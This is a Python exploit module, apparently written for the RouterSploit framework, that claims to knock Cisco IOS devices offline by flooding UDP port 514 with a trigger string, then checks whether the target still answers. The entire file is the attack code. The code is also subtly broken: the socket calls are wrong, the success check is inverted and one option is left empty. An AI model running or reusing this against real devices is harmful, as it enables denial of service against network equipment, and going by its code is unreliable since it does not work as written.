# -*- coding:utf-8 -*-
# Why didn't add above line in HTTP PoC(s)?!
from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    print_status,
    mute,
    validators,
)

import struct
import time
import socket  # Broken PIPE?


class Exploit(exploits.Exploit):
    """
    I am too lazy to write user comments...
    """
    __info__ = {
        'name': 'Cisco UDP port 514 Flood DoS Vulnerability',
        'description': ['Cisco IOS Devices udp port 514 open by default, there is a vulnerability\n'
                        'in udp 514 port data dispatcher procedure. Attacker can exploit it cause\n'
                        'system DoS.'
                        ],
        'authors': [
            'BlackAngels team'  
        ],
        'references': [
            'http://www.securityfocus.com/bid/5976/info',
        ],
        'devices': [
            'Cisco IOS Software Open Up UDP 514',
        ],
        'id': 'sf-5976-9',
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1',
                             validators=validators.url)  # target address
    port = exploits.Option(514, 'Target port')  # default port

    times = exploits.Option(10000, 'Sending packet with payload countss')

    size = exploits.Option()

    # TODO: UNITEST - FUNC TEST - CASE 08 -- Exploit Test
    def run(self):
        data_trigger = "%%%%%XX%%%%%"
        # todo: Ignore socket length param. is corrected?

        sockfd = socket.socket(socket.PF_PACKET, socket.SOCK_DGRAM, 17)
        if sockfd:  # Connection up!
            for i in range(0, self.times):
                try:
                    sockfd.send((self.target, data_trigger, self.port))
                except Exception:
                    print_error("Failed open socket, service online?")
                    break
            if self.check():
                # Still alive?
                print_success("Target down, it's vulnerable!")
                return True
            else:
                print_error("Target may not in suffer")
                return False
        else:
            print_error("Can not create socket!")
            return False

    @mute
    def check(self):
        # TODO: UNITEST - FUNC TEST - CASE 07 -- Check func test
        print_status("Check server status...")
        try:
            # socketfd = socket.socket(socket.PF_PACKET, socket.SOCK_DGRAM, 17)
            # Create socketfd with protocol 17 UDP
            # No needed with UDP - Non-connection protocol
            # socketfd.connect((self.target, self.port))
            # Using TCP for verification
            chksocketfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            chksocketfd.connect((self.target, self.port))
        except Exception:
            print_status("Cannot connect remote target!")
            return False
        print_status("Server is alive")
        return True
